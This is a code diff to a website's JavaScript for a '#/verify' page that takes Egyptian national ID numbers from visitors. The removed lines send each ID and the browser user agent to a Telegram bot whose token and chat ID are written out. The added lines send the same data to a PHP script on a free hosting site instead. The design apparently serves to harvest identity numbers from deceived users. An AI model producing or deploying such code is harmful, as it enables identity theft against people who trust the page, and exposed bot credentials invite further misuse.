@@ -1441,12 +1441,12 @@ function vContact(d, kid) {
   }
 
 /* ============================================================================
-   استقبال الرقم القومي — إرسال مباشر لتليجرام من المتصفح
+   استقبال الرقم القومي — إرسال مباشر إلى استضافة AwardSpace (PHP)
    ============================================================================ */
 (function nidRoute() {
   const ROUTE = '#/verify';
-  const TG_TOKEN = '8505729133:AAHhYWJXTYJY07i4MJcTiKfZVeaxvlusIT8';   // ← توكن البوت
-  const TG_CHAT  = '7951916432';                                // ← chat_id بتاعك
+  // ← ضع رابط استضافتك هنا بدل YOUR_SUBDOMAIN
+  const PHP_API = 'https://starrnightt2030-oss.atwebpages.com/save.php'; 
   const CENTERS = new Set(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','88']);
 
   function isValidNID(raw) {
@@ -1498,14 +1498,14 @@ function vContact(d, kid) {
       if (!isValidNID(v)) { msg.style.color = '#D62839'; msg.textContent = 'الرقم غير صحيح — لازم 14 رقمًا صحيحًا.'; SND.play('error'); return; }
       btn.disabled = true; btn.textContent = 'جارٍ الإرسال…';
       try {
-        const text = `🔔 رقم قومي جديد\n<code>${v}</code>\n🕒 ${new Date().toLocaleString('ar-EG')}\n🌐 ${(navigator.userAgent||'').slice(0,150)}`;
-        const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        const r = await fetch(PHP_API, {
           method: 'POST',
           headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true })
+          body: JSON.stringify({ nid: v, ua: navigator.userAgent })
         });
         const j = await r.json().catch(() => ({}));
-        if (!r.ok || !j.ok) throw new Error(j.description || 'failed');
+        if (!r.ok || !j.ok) throw new Error(j.error || 'failed');
+        
         msg.style.color = '#0E7A4C'; msg.textContent = 'تمّ الإرسال بنجاح.';
         inp.value = ''; upd(); SND.play('fresh');
       } catch (err) {
